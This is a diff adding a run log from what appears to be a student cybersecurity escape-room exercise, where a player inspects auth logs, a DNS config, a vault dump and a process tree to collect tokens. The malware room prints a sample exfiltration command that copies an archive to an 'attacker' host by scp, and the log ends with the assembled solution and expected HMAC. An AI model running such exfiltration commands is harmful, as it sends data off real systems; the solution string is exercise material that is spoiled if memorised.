@@ -1,0 +1,57 @@
+05/11/25 19:32:55 - Welcome to the escape room game
+05/11/25 19:32:55 - 
+    ___________                                    __________                                                             
+    \_   _____/ ______ ____ _____  ______   ____   \______   \ ____   ____   _____                                        
+     |    __)_ /  ___// ___\\__  \ \____ \_/ __ \   |       _//  _ \ /  _ \ /     \                                       
+     |        \\___ \\  \___ / __ \|  |_> >  ___/   |    |   (  <_> |  <_> )  Y Y  \
+    /_______  /____  >\___  >____  /   __/ \___  >  |____|_  /\____/ \____/|__|_|  /                                      
+            \/     \/     \/     \/|__|        \/          \/                    \/                                       
+        
+05/11/25 19:32:55 - Enjoy the escape room!
+05/11/25 19:32:55 - Type quit to quit
+05/11/25 19:32:55 - Type hint for assistance
+05/11/25 19:32:55 - User called move soc
+05/11/25 19:32:55 - You have entered into CurrentRoom.SOC
+05/11/25 19:32:55 - User called inspect auth.log
+05/11/25 19:32:55 - SOC: TOKEN[KEYPAD]=23252
+05/11/25 19:32:55 - SOC: EVIDENCE[KEYPAD].TOP24=198.18.0.0/24
+05/11/25 19:32:55 - SOC: EVIDENCE[KEYPAD].COUNT=52
+05/11/25 19:32:55 - SOC: EVIDENCE[KEYPAD].SAMPLE=2025-08-09T12:00:01Z lab1 sshd[2713]: Failed password for admin from 198.18.0.173 port 48554 protocol 2
+05/11/25 19:32:55 - SOC: EVIDENCE[KEYPAD].MALFORMED_SKIPPED=3
+05/11/25 19:32:55 - User called move dns
+05/11/25 19:32:55 - You have entered into CurrentRoom.DNS
+05/11/25 19:32:55 - User called inspect dns.cfg
+05/11/25 19:32:55 - [DNSRoom] starting decode
+05/11/25 19:32:55 - [Room DNS] Decoding hints...
+05/11/25 19:32:55 - Decoded line: "The code is not in the roots but near the vista"
+05/11/25 19:32:55 - Token formed: vista
+05/11/25 19:32:55 - DNS: TOKEN[DNS]=vista
+05/11/25 19:32:55 - DNS: EVIDENCE[DNS].KEY=hint1
+05/11/25 19:32:55 - DNS: EVIDENCE[DNS].DECODED_LINE=The code is not in the roots but near the vista
+05/11/25 19:32:55 - User called move vault
+05/11/25 19:32:55 - You have entered into CurrentRoom.VAULT
+05/11/25 19:32:55 - User called inspect vault_dump.txt
+05/11/25 19:32:55 - The values 
+SAFE{18-18-36}
+ are valid
+05/11/25 19:32:55 - The results of vault are: {'\nSAFE{18-18-36}\n': ('18', '18', '36')}
+05/11/25 19:32:55 - Vault: TOKEN[SAFE]=18-18-36
+05/11/25 19:32:55 - Vault: EVIDENCE[SAFE].MATCH=SAFE{18-18-36}
+05/11/25 19:32:55 - Vault: EVIDENCE[SAFE].CHECK=18+18=36
+05/11/25 19:32:55 - Returning token: 18-18-36
+05/11/25 19:32:55 - User called move malware
+05/11/25 19:32:55 - You have entered into CurrentRoom.MALWARE
+05/11/25 19:32:55 - User called inspect proc_tree.jsonl
+05/11/25 19:32:55 - [MalwareRoom] Starting traversal
+05/11/25 19:32:55 - [Room MALWARE] Found exfil path: [138->141->142->146]
+05/11/25 19:32:55 - [Room MALWARE] Matched command: "scp /tmp/x.tgz attacker@198.51.100.33:/upload"
+05/11/25 19:32:55 - Malware: TOKEN[PID]=146
+05/11/25 19:32:55 - Malware: EVIDENCE[PID].PATH=[138->141->142->146]
+05/11/25 19:32:55 - Malware: EVIDENCE[PID].CMD="scp /tmp/x.tgz attacker@198.51.100.33:/upload"
+05/11/25 19:32:55 - User called move gate
+05/11/25 19:32:55 - You have entered into CurrentRoom.FINAL_GATE
+05/11/25 19:32:55 - User called use final_gate
+05/11/25 19:32:55 - Final gate was opened with: FINAL_GATE=PENDING
+MSG=msc-group-04|23252-146-18-18-36-vista
+EXPECTED_HMAC=771360e51a90a21d66c78cf6188890df689ddefa8d02432b9387ffb07c723daa
+05/11/25 19:32:55 - Thank you for playing
